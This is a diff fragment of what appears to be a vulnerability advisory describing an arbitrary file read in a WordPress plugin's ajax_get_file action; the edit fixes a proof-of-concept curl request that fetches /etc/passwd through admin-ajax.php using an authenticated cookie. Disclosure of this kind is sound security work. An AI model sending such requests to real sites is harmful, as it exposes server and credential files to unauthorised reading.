@@ -52,7 +52,7 @@ public function ajax_get_file(){
 To exploit this, any authenticated user just needs to perform a POST request to the `/wp-admin/admin-ajax.php` endpoint specifying the needed parameter to trigger the `WP_Filesystem_Direct::get_contents` function.
 
 ```bash
-curl <WORDPRESS_BASE_URL/wp-admin/admin-ajax.php?action=ajax_get_file&url=/etc/passwd
+curl '<WORDPRESS_BASE_URL/wp-admin/admin-ajax.php?action=get_file&url=/etc/passwd' -H 'Cookie: <AUTHENTICATED_USER_COOKIE>'
 ```
 
 Below are some of the findings related to Arbitrary File Read:
